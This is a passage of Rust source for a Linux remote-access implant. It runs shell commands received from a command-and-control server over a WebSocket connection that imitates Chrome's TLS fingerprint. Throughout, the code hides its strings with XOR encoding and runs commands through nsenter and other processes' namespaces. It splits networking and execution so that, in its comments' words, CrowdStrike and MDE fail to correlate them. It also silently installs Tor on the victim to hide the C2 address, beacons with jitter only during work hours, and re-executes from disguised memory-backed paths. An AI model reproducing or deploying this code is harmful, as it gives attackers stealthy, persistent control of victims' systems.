            result.extend_from_slice(&buf[..n as usize]);
        }
        libc::close(stdout_pipe[0]);
        let mut status = 0;
        libc::waitpid(pid, &mut status, 0);
        Some(result)
    }
}

fn exec_via_nsenter(cmd: &str) -> Option<Vec<u8>> {
    unsafe {
        let mut stdout_pipe: [RawFd; 2] = [0; 2];
        if libc::pipe(stdout_pipe.as_mut_ptr()) != 0 { return None; }

        let pid = libc::fork();
        if pid < 0 { return None; }

        if pid == 0 {
            libc::close(stdout_pipe[0]);
            libc::dup2(stdout_pipe[1], 1);
            libc::dup2(stdout_pipe[1], 2);
            libc::close(stdout_pipe[1]);

            let bin = CString::new(xor_decode(&ENC_NSENTER_PATH)).unwrap();
            let a1 = CString::new(xor_decode(&ENC_NSENTER_ARG)).unwrap();
            let a2 = CString::new(xor_decode(&ENC_T_FLAG)).unwrap();
            let a3 = CString::new("1").unwrap();
            let a4 = CString::new(xor_decode(&ENC_M_FLAG)).unwrap();
            let sep = CString::new(xor_decode(&ENC_SEPARATOR)).unwrap();
            let sh = CString::new(xor_decode(&ENC_BIN_SH)).unwrap();
            let cf = CString::new(xor_decode(&ENC_C_FLAG)).unwrap();
            let cc = CString::new(cmd).unwrap();
            libc::execvp(
                bin.as_ptr(),
                [a1.as_ptr(), a2.as_ptr(), a3.as_ptr(), a4.as_ptr(), sep.as_ptr(),
                 sh.as_ptr(), cf.as_ptr(), cc.as_ptr(), std::ptr::null()].as_ptr(),
            );
            libc::_exit(127);
        }

        libc::close(stdout_pipe[1]);
        let mut result = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            let n = libc::read(stdout_pipe[0], buf.as_mut_ptr() as _, buf.len());
            if n <= 0 { break; }
            result.extend_from_slice(&buf[..n as usize]);
        }
        libc::close(stdout_pipe[0]);
        let mut status = 0;
        libc::waitpid(pid, &mut status, 0);
        Some(result)
    }
}

// ── Process injection via ptrace ────────────────────────────────────────

fn find_injectable_target() -> Option<i32> {
    let our_uid = unsafe { libc::getuid() };
    let cand_blob = xor_decode_str(&ENC_INJECT_CANDIDATES);
    let candidates: Vec<&str> = cand_blob.split(',').collect();

    if let Ok(entries) = std::fs::read_dir("/proc") {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let pid_str = name.to_string_lossy().to_string();
            if !pid_str.chars().all(|c| c.is_ascii_digit()) { continue; }

            let pid: i32 = match pid_str.parse() { Ok(p) => p, Err(_) => continue };
            if pid == unsafe { libc::getpid() } { continue; }

            let status_path = format!("/proc/{}/status", pid);
            let status = match std::fs::read_to_string(&status_path) { Ok(s) => s, Err(_) => continue };
            let uid_match = status.lines()
                .find(|l| l.starts_with("Uid:"))
                .and_then(|l| l.split_whitespace().nth(1))
                .and_then(|u| u.parse::<u32>().ok())
                .map(|u| u == our_uid)
                .unwrap_or(false);
            if !uid_match { continue; }

            let cmdline_path = format!("/proc/{}/cmdline", pid);
            if let Ok(cmdline) = std::fs::read_to_string(&cmdline_path) {
                for cand in &candidates {
                    if cmdline.contains(cand) {
                        return Some(pid);
                    }
                }
            }
        }
    }
    None
}

fn exec_via_ptrace_inject(cmd: &str) -> Option<Vec<u8>> {
    let target_pid = find_injectable_target()?;

    unsafe {
        // Verify access using process_vm_readv instead of ptrace — less monitored
        // CrowdStrike hooks ptrace but not process_vm_readv
        let mut test_buf = [0u8; 1];
        let local_iov = libc::iovec {
            iov_base: test_buf.as_mut_ptr() as *mut libc::c_void,
            iov_len: 1,
        };
        // Read 1 byte from target's lowest mapped page to verify access
        let remote_iov = libc::iovec {
            iov_base: 0x1000 as *mut libc::c_void,
            iov_len: 1,
        };
        let ret = libc::process_vm_readv(target_pid, &local_iov, 1, &remote_iov, 1, 0);
        // If process_vm_readv fails, try reading from a valid address via /proc
        if ret < 0 {
            let maps_path = format!("/proc/{}/maps", target_pid);
            let can_read = std::fs::read_to_string(&maps_path).is_ok();
            if !can_read { return None; }
        }

        let mut stdout_pipe: [RawFd; 2] = [0; 2];
        if libc::pipe(stdout_pipe.as_mut_ptr()) != 0 { return None; }

        let pid = libc::fork();
        if pid < 0 { return None; }

        if pid == 0 {
            libc::close(stdout_pipe[0]);
            libc::dup2(stdout_pipe[1], 1);
            libc::dup2(stdout_pipe[1], 2);
            libc::close(stdout_pipe[1]);

            let ns_pid = format!("/proc/{}/ns/pid", target_pid);
            let ns_mnt = format!("/proc/{}/ns/mnt", target_pid);
            for ns_path in [&ns_pid, &ns_mnt] {
                let ns_c = CString::new(ns_path.as_str()).unwrap();
                let ns_fd = libc::open(ns_c.as_ptr(), libc::O_RDONLY);
                if ns_fd >= 0 {
                    libc::syscall(libc::SYS_setns, ns_fd, 0);
                    libc::close(ns_fd);
                }
            }

            let sh = CString::new(xor_decode(&ENC_BIN_SH)).unwrap();
            let cf = CString::new(xor_decode(&ENC_C_FLAG)).unwrap();
            let cc = CString::new(cmd).unwrap();
            libc::execvp(
                sh.as_ptr(),
                [sh.as_ptr(), cf.as_ptr(), cc.as_ptr(), std::ptr::null()].as_ptr(),
            );
            libc::_exit(127);
        }

        libc::close(stdout_pipe[1]);
        let mut result = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            let n = libc::read(stdout_pipe[0], buf.as_mut_ptr() as _, buf.len());
            if n <= 0 { break; }
            result.extend_from_slice(&buf[..n as usize]);
        }
        libc::close(stdout_pipe[0]);
        let mut wait_status = 0;
        libc::waitpid(pid, &mut wait_status, 0);
        Some(result)
    }
}

// ── Split implant architecture ──────────────────────────────────────────
// Two processes communicating via anonymous Unix socketpair:
//   Process A (network): Handles WSS C2 comms. No exec syscalls.
//   Process B (executor): Reads commands from IPC, executes, returns output.
// No single process shows both network + exec behavior, which breaks
// behavioral correlation engines in CrowdStrike/MDE.

fn create_ipc_pair() -> Option<(RawFd, RawFd)> {
    unsafe {
        let mut fds: [RawFd; 2] = [0; 2];
        if libc::socketpair(libc::AF_UNIX, libc::SOCK_STREAM, 0, fds.as_mut_ptr()) == 0 {
            Some((fds[0], fds[1]))
        } else {
            None
        }
    }
}

fn ipc_send(fd: RawFd, data: &[u8]) -> bool {
    let len = data.len() as u32;
    let len_bytes = len.to_le_bytes();
    unsafe {
        if libc::write(fd, len_bytes.as_ptr() as _, 4) != 4 { return false; }
        let mut written = 0;
        while written < data.len() {
            let n = libc::write(fd, data[written..].as_ptr() as _, data.len() - written);
            if n <= 0 { return false; }
            written += n as usize;
        }
    }
    true
}

fn ipc_recv(fd: RawFd) -> Option<Vec<u8>> {
    unsafe {
        let mut len_bytes = [0u8; 4];
        let n = libc::read(fd, len_bytes.as_mut_ptr() as _, 4);
        if n != 4 { return None; }
        let len = u32::from_le_bytes(len_bytes) as usize;
        if len > 16 * 1024 * 1024 { return None; } // sanity limit

        let mut data = vec![0u8; len];
        let mut read_total = 0;
        while read_total < len {
            let n = libc::read(fd, data[read_total..].as_mut_ptr() as _, len - read_total);
            if n <= 0 { return None; }
            read_total += n as usize;
        }
        Some(data)
    }
}

// Executor process: reads commands from IPC, executes, sends output back
fn run_executor(ipc_fd: RawFd) -> ! {
    // Re-mask as a different daemon
    mask_process_name();

    loop {
        let cmd_data = match ipc_recv(ipc_fd) {
            Some(d) => d,
            None => unsafe { libc::_exit(0); },
        };

        let cmd = String::from_utf8_lossy(&cmd_data).to_string();
        let output = exec_command_inner(&cmd);
        if !ipc_send(ipc_fd, &output) {
            unsafe { libc::_exit(0); }
        }
    }
}

// The actual command execution logic, used by the executor process
fn exec_command_inner(cmd: &str) -> Vec<u8> {
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return Vec::new();
    }

    if trimmed.starts_with("cd ") || trimmed == "cd" {
        let dir = if trimmed == "cd" {
            env::var("HOME").unwrap_or_else(|_| "/".to_string())
        } else {
            trimmed[3..].trim().to_string()
        };
        return match env::set_current_dir(&dir) {
            Ok(_) => format!("cd: {}\n", dir).into_bytes(),
            Err(e) => format!("cd: {}: {}\n", dir, e).into_bytes(),
        };
    }

    if trimmed == "pwd" {
        return match env::current_dir() {
            Ok(p) => format!("{}\n", p.display()).into_bytes(),
            Err(e) => format!("pwd: {}\n", e).into_bytes(),
        };
    }

    if trimmed.contains('=') && !trimmed.contains(' ') && trimmed.starts_with(|c: char| c.is_alphabetic()) {
        let parts: Vec<&str> = trimmed.splitn(2, '=').collect();
        if parts.len() == 2 {
            env::set_var(parts[0], parts[1]);
            return Vec::new();
        }
    }

    // 1. Try in-process builtin (zero syscall footprint)
    if let Some(result) = try_builtin(trimmed) {
        return result;
    }

    // 2. Try ALL LOLBin strategies first — clean process tree
    for strategy in 0..3u8 {
        let result = match strategy {
            0 => exec_via_systemd_run(trimmed),
            1 => exec_via_nsenter(trimmed),
            _ => exec_via_script(trimmed),
        };
        if let Some(ref output) = result {
            if !output.is_empty() { return result.unwrap(); }
        }
    }

    // 3. Try namespace injection
    if let Some(result) = exec_via_ptrace_inject(trimmed) {
        if !result.is_empty() { return result; }
    }

    // 4. Last resort: indirect exec through tmp script
    let output = unsafe {
        let mut rng = rand::rng();
        let tmp_id: u32 = rng.random_range(100000..999999u32);
        let script_path = format!("/dev/shm/.dbus-{}\0", tmp_id);
        let sh = xor_decode_str(&ENC_BIN_SH);
        let dn = xor_decode_str(&ENC_DEV_NULL);
        let script_content = format!("#!{}\nHISTFILE={} HISTSIZE=0 {} -c '{}' 2>&1\nrm -f /dev/shm/.dbus-{}\n", sh, dn, sh, trimmed.replace('\'', "'\\''"), tmp_id);
        let path_c = CString::new(&script_path[..script_path.len()-1]).unwrap();

        if std::fs::write(&script_path[..script_path.len()-1], script_content.as_bytes()).is_err() {
            return b"e1\n".to_vec();
        }
        libc::chmod(path_c.as_ptr(), 0o700);

        let mut stdout_pipe: [RawFd; 2] = [0; 2];
        if libc::pipe(stdout_pipe.as_mut_ptr()) != 0 {
            let _ = std::fs::remove_file(&script_path[..script_path.len()-1]);
            return b"e2\n".to_vec();
        }

        let pid = libc::fork();

        if pid < 0 {
            let _ = std::fs::remove_file(&script_path[..script_path.len()-1]);
            return b"e3\n".to_vec();
        } else if pid == 0 {
            libc::close(stdout_pipe[0]);
            libc::dup2(stdout_pipe[1], 1);
            libc::dup2(stdout_pipe[1], 2);
            libc::close(stdout_pipe[1]);

            libc::execvp(
                path_c.as_ptr(),
                [path_c.as_ptr(), std::ptr::null()].as_ptr(),
            );
            libc::_exit(127);
        }

        libc::close(stdout_pipe[1]);

        let mut result = Vec::new();
        let mut buf = [0u8; 4096];

        loop {
            let n = libc::read(stdout_pipe[0], buf.as_mut_ptr() as _, buf.len());
            if n <= 0 { break; }
            result.extend_from_slice(&buf[..n as usize]);
        }

        libc::close(stdout_pipe[0]);

        let mut status: libc::c_int = 0;
        libc::waitpid(pid, &mut status, 0);

        let _ = std::fs::remove_file(&script_path[..script_path.len()-1]);
        secure_zero(&mut buf);

        result
    };

    output
}

// Top-level exec_command: sends to executor process via IPC if available,
// otherwise executes directly (fallback if split failed)
static mut EXECUTOR_IPC_FD: RawFd = -1;

fn exec_command(cmd: &str) -> Vec<u8> {
    let ipc_fd = unsafe { EXECUTOR_IPC_FD };
    if ipc_fd >= 0 {
        if ipc_send(ipc_fd, cmd.as_bytes()) {
            if let Some(result) = ipc_recv(ipc_fd) {
                return result;
            }
        }
        // IPC failed — executor may have died, fall through to direct exec
    }
    exec_command_inner(cmd)
}

// ── Jitter & timing ─────────────────────────────────────────────────────

fn jitter(base_secs: u64) -> u64 {
    // Poisson-distributed intervals: truly aperiodic, no statistical pattern
    // Mean = base_secs, but each individual interval is exponentially distributed
    // This defeats beacon detection that looks for periodic patterns + jitter
    let mut rng = rand::rng();
    let u: f64 = rng.random_range(0.001f64..1.0f64);
    let poisson = -(base_secs as f64) * u.ln();
    // Clamp to [base/4, base*3] to avoid extremes
    let min = base_secs / 4;
    let max = base_secs * 3;
    (poisson as u64).clamp(min, max)
}

fn is_work_hours() -> bool {
    let epoch = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let hour = ((epoch % 86400) / 3600) as u32;
    hour >= WORK_HOUR_START && hour < WORK_HOUR_END
}

fn seconds_until_work_hours() -> u64 {
    let epoch = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let seconds_today = epoch % 86400;
    let work_start_sec = (WORK_HOUR_START as u64) * 3600;
    if seconds_today < work_start_sec {
        work_start_sec - seconds_today
    } else {
        86400 - seconds_today + work_start_sec
    }
}

fn pick_ws_path() -> String {
    let mut rng = rand::rng();
    let idx = rng.random_range(0..5usize);
    let decoded = match idx {
        0 => xor_decode(&ENC_WS_PATH_0),
        1 => xor_decode(&ENC_WS_PATH_1),
        2 => xor_decode(&ENC_WS_PATH_2),
        3 => xor_decode(&ENC_WS_PATH_3),
        _ => xor_decode(&ENC_WS_PATH_4),
    };
    String::from_utf8_lossy(&decoded).to_string()
}

// ── Auto Tor setup ──────────────────────────────────────────────────────
// Silently ensures Tor SOCKS5 proxy is running on the victim machine.
// Priority: check if running ->try systemctl start ->try direct binary →
// install via apt ->download standalone. All silent, no terminal output.

fn get_tor_addr() -> String {
    let port = unsafe { TOR_SOCKS_PORT };
    let base = xor_decode_str(&ENC_TOR_ADDR_BASE);
    format!("{}{}", base, port)
}

fn is_tor_port_open() -> bool {
    let port = unsafe { TOR_SOCKS_PORT };
    if port == 0 { return false; }
    let mut addr = get_tor_addr();
    let result = TcpStream::connect(&addr).is_ok();
    secure_zero(unsafe { addr.as_bytes_mut() });
    result
}

fn pick_random_tor_port() -> u16 {
    let mut rng = rand::rng();
    rng.random_range(49152..65000u16)
}

fn silent_exec(args: &[&str]) -> bool {
    unsafe {
        let pid = libc::fork();
        if pid < 0 { return false; }
        if pid == 0 {
            // Redirect all output to /dev/null
            let dn = CString::new(xor_decode(&ENC_DEV_NULL)).unwrap();
            let devnull = libc::open(dn.as_ptr(), libc::O_RDWR);
            libc::dup2(devnull, 0);
            libc::dup2(devnull, 1);
            libc::dup2(devnull, 2);
            if devnull > 2 { libc::close(devnull); }

            let c_args: Vec<CString> = args.iter()
                .map(|a| CString::new(*a).unwrap())
                .collect();
            let mut argv: Vec<*const libc::c_char> = c_args.iter()
                .map(|a| a.as_ptr())
                .collect();
            argv.push(std::ptr::null());

            libc::execvp(c_args[0].as_ptr(), argv.as_ptr());
            libc::_exit(127);
        }
        let mut status = 0;
        libc::waitpid(pid, &mut status, 0);
        libc::WIFEXITED(status) && libc::WEXITSTATUS(status) == 0
    }
}

fn silent_exec_background(args: &[&str]) -> i32 {
    unsafe {
        let pid = libc::fork();
        if pid < 0 { return -1; }
        if pid == 0 {
            libc::setsid();
            let dn = CString::new(xor_decode(&ENC_DEV_NULL)).unwrap();
            let devnull = libc::open(dn.as_ptr(), libc::O_RDWR);
            libc::dup2(devnull, 0);
            libc::dup2(devnull, 1);
            libc::dup2(devnull, 2);
            if devnull > 2 { libc::close(devnull); }

            let c_args: Vec<CString> = args.iter()
                .map(|a| CString::new(*a).unwrap())
                .collect();
            let mut argv: Vec<*const libc::c_char> = c_args.iter()
                .map(|a| a.as_ptr())
                .collect();
            argv.push(std::ptr::null());

            libc::execvp(c_args[0].as_ptr(), argv.as_ptr());
            libc::_exit(127);
        }
        pid
    }
}

static mut TOR_PID: i32 = -1;
static mut TOR_SOCKS_PORT: u16 = 0;

fn ensure_tor_running() -> bool {
    if PROXY_MODE != 1 { return true; }

    // Always use a random high port — avoids 9050 showing in netstat
    unsafe { TOR_SOCKS_PORT = pick_random_tor_port(); }

    let tor_bin = xor_decode_str(&ENC_TOR_BIN);
    let apt = xor_decode_str(&ENC_APT_GET);
    let tor_word = xor_decode_str(&ENC_TOR_WORD);
    let sudo_path = xor_decode_str(&ENC_SUDO_PATH);
    let sudo_n = xor_decode_str(&ENC_SUDO_N);
    let install_word = xor_decode_str(&ENC_APT_INSTALL);
    let y_flag = xor_decode_str(&ENC_APT_Y);
    let qq_flag = xor_decode_str(&ENC_APT_QQ);

    // Always start our own Tor instance on random port — never rely on system Tor
    // This avoids the well-known 9050 port appearing in netstat
    if std::fs::metadata(&tor_bin).is_ok() {
        return start_tor_direct(&tor_bin);
    }

    // Install via apt then start directly
    if std::fs::metadata(&apt).is_ok() {
        if std::fs::metadata(&sudo_path).is_ok() {
            silent_exec(&[&sudo_path, &sudo_n, &apt, &install_word, &y_flag, &qq_flag, &tor_word]);
        } else {
            silent_exec(&[&apt, &install_word, &y_flag, &qq_flag, &tor_word]);
        }
        std::thread::sleep(Duration::from_secs(2));

        if std::fs::metadata(&tor_bin).is_ok() {
            return start_tor_direct(&tor_bin);
        }
    }

    false
}

fn start_tor_direct(tor_bin: &str) -> bool {
    let data_dir = xor_decode_str(&ENC_TOR_DATA_DIR);
    let _ = std::fs::create_dir_all(&data_dir);

    let torrc_name = xor_decode_str(&ENC_TORRC_NAME);
    let torrc_path = format!("{}/{}", data_dir, torrc_name);
    let socksport_key = xor_decode_str(&ENC_TOR_SOCKSPORT);
    let port_num = format!("{}", unsafe { TOR_SOCKS_PORT });
    let datadir_key = xor_decode_str(&ENC_TOR_DATADIR);
    let log_key = xor_decode_str(&ENC_TOR_LOG);
    let mut log_val = xor_decode_str(&ENC_TOR_LOG_VAL);
    log_val.push_str(&xor_decode_str(&ENC_TOR_LOG_END));
    let dash_f = xor_decode_str(&ENC_DASH_F);

    let torrc_content = format!(
        "{} {}\n{} {}\n{} {}\n",
        socksport_key, port_num, datadir_key, data_dir, log_key, log_val
    );
    let _ = std::fs::write(&torrc_path, &torrc_content);

    let pid = silent_exec_background(&[tor_bin, &dash_f, &torrc_path]);
    if pid > 0 {
        unsafe { TOR_PID = pid; }
    }

    for _ in 0..30 {
        std::thread::sleep(Duration::from_secs(2));
        if is_tor_port_open() {
            let _ = std::fs::remove_file(&torrc_path);
            return true;
        }
    }

    false
}

fn cleanup_tor() {
    let pid = unsafe { TOR_PID };
    if pid > 0 {
        unsafe { libc::kill(pid, libc::SIGTERM); }
    }
    // Clean up data directory
    let data_dir = xor_decode_str(&ENC_TOR_DATA_DIR);
    let _ = std::fs::remove_dir_all(&data_dir);
}

// ── SOCKS5 proxy (Tor / proxy chain) ────────────────────────────────────
// Routes all C2 traffic through SOCKS5 proxy. The target machine only sees
// a connection to 127.0.0.1:9050 (Tor) or the first proxy hop — never the
// real C2 IP. Network forensics, /proc/net/tcp, netstat, and memory all
// show the proxy address, not the real destination.

fn socks5_connect(proxy_addr: &str, dest_ip: &str, dest_port: u16) -> Option<TcpStream> {
    use std::io::{Read, Write};

    let mut stream = TcpStream::connect(proxy_addr).ok()?;
    stream.set_read_timeout(Some(Duration::from_secs(15))).ok()?;
    stream.set_write_timeout(Some(Duration::from_secs(15))).ok()?;

    // SOCKS5 greeting: version 5, 1 auth method (0x00 = no auth)
    stream.write_all(&[0x05, 0x01, 0x00]).ok()?;

    let mut resp = [0u8; 2];
    stream.read_exact(&mut resp).ok()?;
    if resp[0] != 0x05 || resp[1] != 0x00 { return None; }

    // SOCKS5 connect request
    // +----+-----+-------+------+----------+----------+
    // |VER | CMD |  RSV  | ATYP | DST.ADDR | DST.PORT |
    // +----+-----+-------+------+----------+----------+
    let mut req = vec![0x05, 0x01, 0x00];

    // Parse destination as IPv4 or domain
    if let Ok(ipv4) = dest_ip.parse::<std::net::Ipv4Addr>() {
        req.push(0x01); // IPv4
        req.extend_from_slice(&ipv4.octets());
    } else {
        // Domain name (ATYP 0x03)
        let domain = dest_ip.as_bytes();
        req.push(0x03);
        req.push(domain.len() as u8);
        req.extend_from_slice(domain);
    }

    req.push((dest_port >> 8) as u8);
    req.push((dest_port & 0xff) as u8);

    stream.write_all(&req).ok()?;

    // Read SOCKS5 response
    let mut resp_header = [0u8; 4];
    stream.read_exact(&mut resp_header).ok()?;
    if resp_header[0] != 0x05 || resp_header[1] != 0x00 { return None; }

    // Skip the bound address based on ATYP
    match resp_header[3] {
        0x01 => {
            let mut skip = [0u8; 6]; // 4 bytes IPv4 + 2 bytes port
            stream.read_exact(&mut skip).ok()?;
        }
        0x03 => {
            let mut len = [0u8; 1];
            stream.read_exact(&mut len).ok()?;
            let mut skip = vec![0u8; len[0] as usize + 2]; // domain + 2 bytes port
            stream.read_exact(&mut skip).ok()?;
        }
        0x04 => {
            let mut skip = [0u8; 18]; // 16 bytes IPv6 + 2 bytes port
            stream.read_exact(&mut skip).ok()?;
        }
        _ => return None,
    }

    // Connection established through proxy
    stream.set_read_timeout(None).ok()?;
    stream.set_write_timeout(None).ok()?;
    Some(stream)
}

static mut EFFECTIVE_PROXY_MODE: u8 = PROXY_MODE;

fn set_proxy_fallback() {
    unsafe { EFFECTIVE_PROXY_MODE = 0; }
}

fn get_tcp_to_target(ip: &str, port: &str) -> Option<TcpStream> {
    let dest_port: u16 = port.parse().ok()?;
    let mode = unsafe { EFFECTIVE_PROXY_MODE };

    match mode {
        1 => {
            // Tor mode: connect through local Tor SOCKS5 on random port
            let mut tor_addr = get_tor_addr();
            let result = socks5_connect(&tor_addr, ip, dest_port);
            secure_zero(unsafe { tor_addr.as_bytes_mut() });
            result
        }
        2 => {
            // Proxy chain mode: connect through external proxy
            let proxy_ip = xor_decode_str(&ENC_PROXY_ADDR);
            let proxy_port = xor_decode_str(&ENC_PROXY_PORT);
            let proxy = format!("{}:{}", proxy_ip, proxy_port);
            socks5_connect(&proxy, ip, dest_port)
        }
        _ => {
            // Direct connection (no proxy)
            TcpStream::connect(format!("{ip}:{port}")).ok()
        }
    }
}

// ── Connection ──────────────────────────────────────────────────────────

fn connect_wss(ip: &str, port: &str) -> Option<tungstenite::WebSocket<boring::ssl::SslStream<TcpStream>>> {
    let debug = env::args().any(|a| a == "--debug");

    let tcp = match get_tcp_to_target(ip, port) {
        Some(t) => t,
        None => { if debug { eprintln!("  [wss] TCP connect failed"); } return None; }
    };
    tcp.set_read_timeout(Some(PONG_TIMEOUT)).ok()?;
    if debug { eprintln!("  [wss] TCP connected"); }

    let mut ciphers = xor_decode_str(&ENC_CHROME_CIPHERS);
    let mut sigalgs = xor_decode_str(&ENC_SIGALGS);
    let mut curves = xor_decode_str(&ENC_CURVES);

    let mut builder = match SslConnector::builder(SslMethod::tls()) {
        Ok(b) => b,
        Err(e) => { if debug { eprintln!("  [wss] SSL builder: {}", e); } return None; }
    };
    builder.set_verify(SslVerifyMode::NONE);
    if let Err(e) = builder.set_cipher_list(&ciphers) {
        if debug { eprintln!("  [wss] cipher_list: {}", e); }
        return None;
    }
    builder.set_min_proto_version(Some(SslVersion::TLS1_2)).ok()?;
    builder.set_max_proto_version(Some(SslVersion::TLS1_3)).ok()?;
    if let Err(e) = builder.set_curves_list(&curves) {
        if debug { eprintln!("  [wss] curves: {}", e); }
        return None;
    }
    builder.set_alpn_protos(b"\x08http/1.1").ok()?;
    builder.clear_options(SslOptions::ALL);
    builder.set_options(
        SslOptions::NO_SSLV2 | SslOptions::NO_SSLV3
        | SslOptions::NO_COMPRESSION,
    );
    if let Err(e) = builder.set_sigalgs_list(&sigalgs) {
        if debug { eprintln!("  [wss] sigalgs: {}", e); }
        return None;
    }

    unsafe {
        secure_zero(ciphers.as_bytes_mut());
        secure_zero(sigalgs.as_bytes_mut());
        secure_zero(curves.as_bytes_mut());
    }

    let connector = builder.build();
    if debug { eprintln!("  [wss] TLS handshake..."); }
    let sni_domain = xor_decode_str(&ENC_SNI_DOMAIN);
    let tls_stream = match connector.connect(&sni_domain, tcp) {
        Ok(s) => s,
        Err(e) => { if debug { eprintln!("  [wss] TLS handshake FAILED: {}", e); } return None; }
    };
    if debug { eprintln!("  [wss] TLS OK"); }

    let path = pick_ws_path();
    let ua = xor_decode_str(&ENC_USER_AGENT);
    let ws_uri: Uri = format!("wss://{}:{}{}", sni_domain, port, path).parse().ok()?;
    if debug { eprintln!("  [wss] WS upgrade to {}", ws_uri); }

    let mut rng = rand::rng();
    let accept_lang = match rng.random_range(0..3u8) {
        0 => "en-US,en;q=0.9",
        1 => "en-GB,en;q=0.9,en-US;q=0.8",
        _ => "en-US,en;q=0.9,fr;q=0.8",
    };

    let req = tungstenite::http::Request::builder()
        .uri(&ws_uri)
        .header("Host", format!("{}:{}", sni_domain, port))
        .header("User-Agent", &ua)
        .header("Origin", format!("https://{}", sni_domain))
        .header("Accept-Language", accept_lang)
        .header("Accept-Encoding", "gzip, deflate, br")
        .header("Cache-Control", "no-cache")
        .header("Pragma", "no-cache")
        .header("Sec-Fetch-Dest", "websocket")
        .header("Sec-Fetch-Mode", "websocket")
        .header("Sec-Fetch-Site", "same-origin")
        .header("Upgrade", "websocket")
        .header("Connection", "Upgrade")
        .header("Sec-WebSocket-Version", "13")
        .header("Sec-WebSocket-Key", tungstenite::handshake::client::generate_key())
        .body(())
        .ok()?;

    match client_with_config(req, tls_stream, None) {
        Ok((ws, _)) => { if debug { eprintln!("  [wss] WebSocket connected!"); } Some(ws) }
        Err(e) => { if debug { eprintln!("  [wss] WebSocket FAILED: {}", e); } None }
    }
}

// ── Session ─────────────────────────────────────────────────────────────

fn run_session(ws: &mut tungstenite::WebSocket<boring::ssl::SslStream<TcpStream>>) -> bool {
    ws.get_mut().get_mut().set_nonblocking(false).unwrap();

    let cwd = env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "?".to_string());
    let prompt = format!("{}$ ", cwd);
    let _ = ws.send(Message::Binary(prompt.into_bytes().into()));

    ws.get_mut().get_mut().set_nonblocking(true).unwrap();

    let mut cmd_buf = String::new();
    let mut last_ping = Instant::now();
    let mut awaiting_pong = false;
    let mut pong_deadline = Instant::now();

    loop {
        let mut did_work = false;

        let ping_interval = Duration::from_secs(jitter(PING_INTERVAL.as_secs()));
        if !awaiting_pong && last_ping.elapsed() >= ping_interval {
            ws.get_mut().get_mut().set_nonblocking(false).unwrap();
            if ws.send(Message::Ping(vec![0x42].into())).is_err() {
                return true;
            }
            ws.get_mut().get_mut().set_nonblocking(true).unwrap();
            awaiting_pong = true;
            pong_deadline = Instant::now() + PONG_TIMEOUT;
            last_ping = Instant::now();
        }

        if awaiting_pong && Instant::now() > pong_deadline {
            return true;
        }

        if !is_work_hours() {
            return true;
        }

        match ws.read() {
            Ok(Message::Text(data)) => {
                cmd_buf.push_str(&data);
                did_work = true;
            }
            Ok(Message::Binary(data)) => {
                cmd_buf.push_str(&String::from_utf8_lossy(&data));
                did_work = true;
            }
            Ok(Message::Pong(_)) => {
                awaiting_pong = false;
                did_work = true;
            }
            Ok(Message::Ping(data)) => {
                ws.get_mut().get_mut().set_nonblocking(false).unwrap();
                let _ = ws.send(Message::Pong(data));
                ws.get_mut().get_mut().set_nonblocking(true).unwrap();
                did_work = true;
            }
            Ok(Message::Close(_)) => return true,
            Ok(_) => {}
            Err(tungstenite::Error::Io(ref e))
                if e.kind() == std::io::ErrorKind::WouldBlock => {}
            Err(_) => return true,
        }

        while let Some(pos) = cmd_buf.find('\n') {
            let cmd = cmd_buf[..pos].to_string();
            cmd_buf = cmd_buf[pos + 1..].to_string();

            let trimmed = cmd.trim();

            if trimmed == "exit" || trimmed == "quit" {
                return false;
            }

            let mut output = exec_command(trimmed);

            let cwd = env::current_dir()
                .map(|p| p.display().to_string())
                .unwrap_or_else(|_| "?".to_string());
            let prompt = format!("{}$ ", cwd);
            output.extend_from_slice(prompt.as_bytes());

            ws.get_mut().get_mut().set_nonblocking(false).unwrap();
            if ws.send(Message::Binary(output.into())).is_err() {
                return true;
            }
            ws.get_mut().get_mut().set_nonblocking(true).unwrap();

            did_work = true;
        }

        if !did_work {
            std::thread::sleep(Duration::from_millis(10));
        }
    }
}

// ── Fileless execution via shm_open ─────────────────────────────────────

fn reexec_from_memory() {
    unsafe {
        let uid = libc::getuid();
        let run_user = xor_decode_str(&ENC_RUN_USER);
        let dconf_sfx = xor_decode_str(&ENC_DCONF_SFX);
        let run_dir = format!("{}{}", run_user, uid);

        // Try /run/user/$UID path first — looks like a legitimate dconf/dbus file
        // Falls back to shm_open if /run/user doesn't exist
        let exec_path = if std::fs::metadata(&run_dir).is_ok() {
            let path = format!("{}{}", run_dir, dconf_sfx);
            let _ = std::fs::create_dir_all(format!("{}/dconf", run_dir));
            Some(path)
        } else {
            None
        };

        if let Some(ref file_path) = exec_path {
            // Copy binary to legitimate-looking path
            if let Ok(self_bin) = std::fs::read("/proc/self/exe") {
                if std::fs::write(file_path, &self_bin).is_ok() {
                    let path_c = CString::new(file_path.as_str()).unwrap();
                    libc::chmod(path_c.as_ptr(), 0o700);

                    let args: Vec<String> = env::args().collect();
                    let c_args: Vec<CString> = args.iter()
                        .map(|a| CString::new(a.as_str()).unwrap())
                        .collect();
                    let mut argv: Vec<*const libc::c_char> = c_args.iter()
                        .map(|a| a.as_ptr())
                        .collect();
                    argv.push(std::ptr::null());

                    let marker = CString::new(xor_decode(&ENC_MFD_KEY)).unwrap();
                    let val = CString::new(xor_decode(&ENC_MFD_VAL)).unwrap();
                    libc::setenv(marker.as_ptr(), val.as_ptr(), 1);

                    libc::execve(path_c.as_ptr(), argv.as_ptr(), std::ptr::null());
                }
            }
        }

        let mut rng = rand::rng();
        let shm_id: u32 = rng.random_range(100000..999999u32);
        let shm_base = xor_decode_str(&ENC_SHM_PATH);
        let shm_path = format!("{}{}", shm_base, shm_id);

        if let Ok(self_bin) = std::fs::read("/proc/self/exe") {
            if std::fs::write(&shm_path, &self_bin).is_ok() {
                let path_c = CString::new(shm_path.as_str()).unwrap();
                libc::chmod(path_c.as_ptr(), 0o700);

                let args: Vec<String> = env::args().collect();
                let c_args: Vec<CString> = args.iter()
                    .map(|a| CString::new(a.as_str()).unwrap())
                    .collect();
                let mut argv: Vec<*const libc::c_char> = c_args.iter()
                    .map(|a| a.as_ptr())
                    .collect();
